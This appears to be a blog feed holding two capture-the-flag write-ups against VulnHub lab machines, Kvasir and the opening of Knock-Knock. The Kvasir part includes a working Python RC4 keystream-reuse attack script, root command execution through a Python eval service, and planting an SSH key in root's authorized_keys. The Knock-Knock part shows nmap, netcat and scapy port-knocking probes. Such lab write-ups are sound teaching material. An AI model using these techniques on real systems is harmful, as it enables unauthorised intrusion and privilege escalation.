<p>UNRAR 4.10 freeware      Copyright &copy; 1993-2012 Alexander Roshal</p>

<p>Extracting from /mnt/Secret.rar</p>

<p>Enter password (will not be echoed) for MyPassword.txt:</p>

<p>Extracting  MyPassword.txt                                            OK
All OK
root@kali:~# cat MyPassword.txt
5224XbG5ki2C
```</p>

<p>Yep! However, another random string. Remembering the note about this being a disk image from <code>kefka</code>, I attempted to SSH into <strong>192.168.4.100</strong> as <code>kefka</code> with this password:</p>

<p>```bash
root@kali:~# proxychains ssh -D 8002 <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x6b;&#101;&#x66;&#x6b;&#97;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#52;&#x2e;&#49;&#x30;&#48;">&#x6b;&#101;&#x66;&#x6b;&#97;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x34;&#x2e;&#x31;&#48;&#x30;</a>
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#107;&#x65;&#x66;&#x6b;&#x61;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#52;&#46;&#x31;&#48;&#x30;">&#107;&#x65;&#102;&#x6b;&#97;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x34;&#x2e;&#49;&#x30;&#x30;</a>&rsquo;s password: # entered 5224XbG5ki2C
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
kefka@adm:~$
```</p>

<p>A final <code>tcp/8002</code> proxy was opened on my attacking machine.</p>

<h2>taking the last ride to the flag</h2>

<p>Enumeration as kefka revealed that this user is allowed to run <code>/opt/wep2.py</code> as root. This is almost screaming at me as the privilege escalation path!</p>

<p>I ran the script with sudo, just to be presented with&hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:</p>

<p>```bash
kefka@adm:~$ sudo /opt/wep2.py
^CTraceback (most recent call last):
  File &ldquo;/opt/wep2.py&rdquo;, line 93, in <module></p>

<pre><code>sock, addr = s.accept()
</code></pre>

<p>  File &ldquo;/usr/lib/python2.7/socket.py&rdquo;, line 202, in accept</p>

<pre><code>sock, addr = self._sock.accept()
</code></pre>

<p>KeyboardInterrupt
kefka@adm:~$
```</p>

<p>I re-run the script backgrounding it with <code>&amp;</code>, and inspect the output of <code>netstat -pant</code> to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new <code>tcp/8002</code> proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:</p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8002</h1>

<h1>connections will appear to be coming from localhost</h1>

<p>root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
127.0.0.1: inverse host lookup failed:</p>

<h1>(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress</h1>

<h1>Can you retrieve my secret..?</h1>

<p>Usage:
&lsquo;V&rsquo; to view the encrypted flag
&lsquo;E&rsquo; to encrypt a plaintext string (e.g. &lsquo;E AAAA&rsquo;)</p>

<p>V
5a5062:36507a63b56865f7fd201860
^C
root@kali:~#
```</p>

<p>We are presented with yet another <em>game</em>, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the <code>netcat</code> connection killed, causing me to have to re-run <code>sudo /opt/wep2.py</code> on the kefka session.</p>

<p>By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were <code>salt:cyphertext</code>, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with <em>A</em>, and studied the output:</p>

<p><code>bash
E A
348bbc:8d
E A
f2fb0c:6e
E A
64d7fb:2d
</code></p>

<p>Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.</p>

<p>Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename <code>wep2.py</code> should be taken as a hint!</p>

<p><em>This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)</em></p>

<h3>understanding what WEP actually is</h3>

<p>With the limited interaction I have had with the last game, and the hint <code>wep2</code>, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.</p>

<p>Some resources that really helped me get to grips with what we are facing here was:
 <a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf">http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</a>
 <a href="http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt">http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt</a>
 <a href="http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt">http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt</a>
 <a href="http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf">http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf</a></p>

<p>Of the above list, I highly recommend you check out the <code>.ppt</code>&rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.</p>

<p>The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let <em>C</em> be the cipher text and <em>P</em> be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:</p>

<p><strong>C = P ^ RC4(iv, k)</strong></p>

<p>With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about <a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">Stream Cipher Attacks</a> and <a href="http://en.wikipedia.org/wiki/Related-key_attack">Related Key Attacks</a>. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.</p>

<p>My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the <code>2</code> in <code>wep2</code> was another troll :)</p>

<h3>attacking the encryption game</h3>

<p>Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.</p>

<p>I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).</p>

<p>Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.</p>

<p>I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&rsquo;s cipher text:</p>

<p>```bash
root@kali:~# proxychains ./un_wep-testing.py
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
[+] Generating base iv:cy dictionary with &lsquo;A&rsquo; <em>24
[+] iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &lsquo;B&rsquo; </em>24
[+] Frame matched IV of 929d87 in 4559 tries!
[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48</p>

<p>[+] A ^ B
BBBBBBBBBBBBBBBBBBBBBBBB
[+] Done
```</p>

<p>This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.</p>

<p>With the changes in, I ended up with the following script:</p>

<p>```bash</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir RC4 Key Re-use Attack</h1>

<p>import socket</p>

<h1>start a fresh iv_dict used for lookups</h1>

<p>iv_dict = {}</p>

<h1>connection to the thing</h1>

<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&lsquo;127.0.0.1&rsquo;, 1234))</p>

<h1>read the banner so we can continue</h1>

<h1>=============================</h1>

<h1>Can you retrieve my secret..?</h1>

<h1>=============================</h1>

<h1></h1>

<h1>Usage:</h1>

<h1>&lsquo;V&rsquo; to view the encrypted flag</h1>

<h1>&lsquo;E&rsquo; to encrypt a plaintext string (e.g. &lsquo;E AAAA&rsquo;)</h1>

<p>banner = sock.recv(1024)</p>

<h1>create some iv:cyper combinations of the flag</h1>

<p>print &lsquo;[+] Generating base iv:cy dictionary&rsquo;
for i in range(0,5000):</p>

<pre><code>sock.send('V\n')
frame = sock.recv(150)
iv = frame.split(':')[0]
cy = frame.split(':')[1]

# add the values
iv_dict[iv] = cy.strip()
</code></pre>

<p>print &lsquo;[+] The iv_dict knows about %d combinations&rsquo; % len(iv_dict)</p>

<h1>start processing the second string, looking up the IV</h1>

<p>print &lsquo;[+] Starting Bruteforce with \'B\&rsquo; *24'
count = 0
while True:</p>

<pre><code>count += 1
sock.send('E ' + 'B' *24 + '\n')
frame = sock.recv(150)
iv = frame.split(':')[0]
cy = frame.split(':')[1].strip() # annoying \n

if iv in iv_dict:
    print '[+] Frame matched IV of %s in %d tries!' % (iv, count)
    print '[+] Base Cyper Text was: %s' % iv_dict[iv]
    print '[+] Matched Cypher Text: %s' % cy

    # first XOR to get the keystream for this IV
    keystream = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode("hex"),'B'*24))
    print '[+] Keystream: %s' % keystream.encode("hex")

    # then decode second cypher text using the keystream for the cleartext
    decrypted = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode("hex"),keystream))
    print '[+] Decrytped flag is: %s' % decrypted
    break

# progress incase things take longer than expected
if count % 100000 == 0:
    print '[+] Tries: %d' % count
</code></pre>

<p>print &lsquo;[+] Done&rsquo;
sock.close()
```</p>

<p>In no time at all, the above code outputs the decrypted flag:</p>

<p><code>bash
root@kali:~# proxychains ./un_wep.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary
[+] The iv_dict knows about 5000 combinations
[+] Starting Bruteforce with 'B' *24
[+] Frame matched IV of 06f39e in 1696 tries!
[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
[+] Decrytped flag is: 0W6U6vwG4W1V
[+] Done
</code></p>

<p><code>0W6U6vwG4W1V</code>. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&hellip; bed time for me!!</p>

<h2>finally getting the flag, sort of&hellip;</h2>

<p>I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.</p>

<p>After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:</p>

<p>```bash
root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
127.0.0.1: inverse host lookup failed:</p>

<h1>(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress</h1>

<h1>Can you retrieve my secret..?</h1>

<p>Usage:
&lsquo;V&rsquo; to view the encrypted flag
&lsquo;E&rsquo; to encrypt a plaintext string (e.g. &lsquo;E AAAA&rsquo;)</p>

<p>0W6U6vwG4W1V</p>

<blockquote><p>```</p></blockquote>

<p>Wut. Ok, so I have a <em>thing</em> now. It didn’t accept anything I was typing into it. Everything just came back with another <code>&gt;</code>.</p>

<p>```bash</p>

<blockquote><p>ls
id
whoami
ls -lah
uname -a
help
?</p>

<p>```</p></blockquote>

<p>I disconnected from the netcat session and tabbed back to the session where the <code>/opt/wep2.py</code> script is started. Immediately it became clear what was going on:</p>

<p>```bash
kefka@adm:~$ sudo /opt/wep2.py
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;ls&rsquo; is not defined
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;whoami&rsquo; is not defined
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;ls&rsquo; is not defined
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;uname&rsquo; is not defined
  File &ldquo;<string>&rdquo;, line 1</p>

<pre><code>?
^
</code></pre>

<p>SyntaxError: invalid syntax
Traceback (most recent call last):
  File &ldquo;/opt/wep2.py&rdquo;, line 94, in <module></p>

<pre><code>handler(sock, addr)
</code></pre>

<p>  File &ldquo;/opt/wep2.py&rdquo;, line 74, in handler</p>

<pre><code>sock.send(p1)
</code></pre>

<p>socket.error: [Errno 32] Broken pipe
kefka@adm:~$
```</p>

<p>It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:</p>

<p>```bash
0W6U6vwG4W1V</p>

<blockquote><p>import os; os.system(&lsquo;id&rsquo;);
uid=0(root) gid=0(root) groups=0(root)
```</p></blockquote>

<p>Yay :) I went straight for the <code>cat /root/flag</code>:</p>

<p>```bash</p>

<blockquote><p>import os; os.system(&lsquo;cat /root/flag&rsquo;);</p>

<pre><code>_  __                             _            
</code></pre>

<p>   | |/ /   <strong> </strong>   <strong> _     </strong><em>     (</em>)      _ <em><br/>
   | &lsquo; &lt;    \ I /  / </em><code>|   (_-&lt;     | |     | '_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
  "</code>-0-0-&rsquo;&ldquo;<code>-0-0-'"</code>-0-0-&lsquo;&rdquo;<code>-0-0-'"</code>-0-0-&rsquo;&ldquo;`-0-0-'</p></blockquote>

<p>Pbatenghyngvbaf ba orngvat Xinfve &ndash; V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
gur Zrnq bs Cbrgel&hellip;</p>

<p>Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.</p>

<p>Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.</p>

<p>  enfgn_zbhfr(@_EnfgnZbhfr)</p>

<blockquote><p>```</p></blockquote>

<p>Err, oh <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&rsquo;d in as root:</p>

<p>```bash
root@kali:~# proxychains ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#48;&#46;&#x31;">&#114;&#x6f;&#x6f;&#116;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;</a> -i kvasir_key
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 16:57:16 2014 from localhost
root@adm:~#
```</p>

<h2>the final troll</h2>

<p>With the <code>/root/flag</code> in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with <code>decode()</code> again:</p>

<p>```bash
root@adm:~# python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>with open(&lsquo;/root/flag&rsquo;) as f:
&hellip;     flag = f.read()
&hellip;
print flag.decode(&lsquo;rot13&rsquo;)</p>

<pre><code>_  __                             _            
</code></pre>

<p>   | |/ /   <strong> </strong>   <strong> _     </strong><em>     (</em>)      _ <em><br/>
   | &lsquo; &lt;    \ V /  / </em><code>|   (_-&lt;     | |     | '_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
  "</code>-0-0-&rsquo;&ldquo;<code>-0-0-'"</code>-0-0-&lsquo;&rdquo;<code>-0-0-'"</code>-0-0-&rsquo;&ldquo;`-0-0-'</p></blockquote></blockquote></blockquote>

<p>Congratulations on beating Kvasir &ndash; I hope you enjoyed
the ride.  Take his blood, mix with honey and drink
the Mead of Poetry&hellip;</p>

<p>Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.</p>

<p>Feel free to ping me with thoughts/comments on
<a href="http://wi-fu.co.uk,">http://wi-fu.co.uk,</a> #VulnHub IRC or Twitter.</p>

<p>  rasta_mouse(@_RastaMouse)</p>

<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>

<h2>conclusion</h2>

<p>Wow. I actually can&rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!</p>

<p>Many many thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for putting together this polished piece of work and <a href="https://twitter.com/VulHub">@VulnHub</a> for the hosting!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[knock-knock who’s there?]]></title>
    <link href="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/"/>
    <updated>2014-10-14T09:14:26+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<!--more-->


<blockquote><p>“Theodore!”</p>

<p>“Theodore who?”</p>

<p>“Theodore wasn&rsquo;t open so I knocked”</p></blockquote>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<p>```bash
$ sudo nmap -sN 192.168.56.0/24</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 09:51 SAST
Nmap scan report for 192.168.56.1
Host is up (0.000030s latency).
All 1000 scanned ports on 192.168.56.1 are closed (936) or open|filtered (64)</p>

<p>Nmap done: 256 IP addresses (1 host up) scanned in 14.99 seconds
```</p>

<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<p>```bash
$ arp -i vboxnet0 -a
? (192.168.56.0) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
? (192.168.56.2) at (incomplete) on vboxnet0 ifscope [ethernet]</p>

<p>[&hellip; snip &hellip;]</p>

<p>? (192.168.56.201) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.202) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.203) at 8:0:27:be:dd:c8 on vboxnet0 ifscope [ethernet]
? (192.168.56.204) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.205) at (incomplete) on vboxnet0 ifscope [ethernet]</p>

<p>[&hellip; snip &hellip;]</p>

<p>? (192.168.56.255) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
```</p>

<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<p>```bash
root@kali:~# ping -c 2 192.168.56.203
PING 192.168.56.203 (192.168.56.203) 56(84) bytes of data.
From 192.168.56.203 icmp_seq=1 Destination Port Unreachable
From 192.168.56.203 icmp_seq=2 Destination Port Unreachable</p>

<p>&mdash;&ndash; 192.168.56.203 ping statistics &mdash;&ndash;
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 999ms
```</p>

<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<p>```bash
root@kali:~# nmap -sV &mdash;reason 192.168.56.203 -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 10:03 SAST
Nmap scan report for 192.168.56.203
Host is up, received reset (0.0016s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT     STATE SERVICE REASON  VERSION
1337/tcp open  waste?  syn-ack</p>

<p>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port1337-TCP:V=6.46%I=7%D=10/14%Time=543CEE50%P=i686-pc-linux-gnu%r(NUL
SF:L,15,&ldquo;[12247,\x202759,\x2026802]\n&rdquo;)%r(GenericLines,15,&ldquo;[37866,\x202
SF:9242,\x203904]\n&rdquo;)%r(GetRequest,15,&ldquo;[29185,\x207368,\x2028937]\n&rdquo;)%r
SF:(HTTPOptions,15,&ldquo;[55772,\x205315,\x2050180]\n&rdquo;)%r(RTSPRequest,13,&ldquo;[9
SF:301,\x2026341,\x20574]\n&rdquo;)%r(RPCCheck,16,&ldquo;[34002,\x2046353,\x2023995\
SF:]\n&rdquo;)%r(DNSVersionBindReq,16,&ldquo;[47043,\x2037532,\x2024012]\n&rdquo;)%r(DNSSt
SF:atusRequest,15,&ldquo;[31914,\x208919,\x2027965]\n&rdquo;)%r(Help,15,&ldquo;[63865,\x2
SF:07077,\x2055801]\n&rdquo;)%r(SSLSessionReq,15,&ldquo;[30406,\x208520,\x2047713]\
SF:n&rdquo;)%r(Kerberos,16,&ldquo;[10459,\x2050977,\x2063996]\n&rdquo;)%r(SMBProgNeg,16,&ldquo;\
SF:[61080,\x2038407,\x2048416]\n&rdquo;)%r(X11Probe,15,&ldquo;[61127,\x2058212,\x203
SF:856]\n&rdquo;)%r(FourOhFourRequest,16,&ldquo;[11007,\x2051452,\x2038765]\n&rdquo;)%r(L
SF:PDString,15,&ldquo;[5738,\x2063719,\x2026394]\n&rdquo;)%r(LDAPBindReq,14,&ldquo;[14292
SF:,\x20937,\x2020668]\n&rdquo;)%r(SIPOptions,16,&ldquo;[33684,\x2058491,\x2031373]
SF:\n&rdquo;)%r(LANDesk-RC,16,&ldquo;[58946,\x2030941,\x2053345]\n&rdquo;)%r(TerminalServe
SF:r,15,&ldquo;[6672,\x2031370,\x2053882]\n&rdquo;)%r(NCP,16,&ldquo;[15356,\x2041972,\x20
SF:52087]\n&rdquo;)%r(NotesRPC,16,&ldquo;[51444,\x2044303,\x2013901]\n&rdquo;)%r(WMSReque
SF:st,13,&ldquo;[87,\x2044952,\x2060309]\n&rdquo;)%r(oracle-tns,15,&ldquo;[51073,\x204686
SF:0,\x206777]\n&rdquo;)%r(afp,16,&ldquo;[30287,\x2064026,\x2029364]\n&rdquo;)%r(kumo-ser
SF:ver,14,&ldquo;[17824,\x2048485,\x20579]\n&rdquo;);</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
```</p>

<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<p>```bash
root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[6605, 29872, 38566]</p>

<p>root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[43059, 22435, 17432]
```</p>

<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<p>```bash
root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
43059/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
22435/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
17432/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```</p>

<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<p>```bash</p>

<blockquote><blockquote><blockquote><p>ip=IP(dst=&ldquo;192.168.56.203&rdquo;)
SYN=TCP(dport=40508,flags=&ldquo;S&rdquo;)
send(ip/SYN)
.
Sent 1 packets.</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<p>```bash
root@kali:~# nmap 192.168.56.203</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:40 SAST
Nmap scan report for 192.168.56.203
Host is up (0.00032s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
```</p>

<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

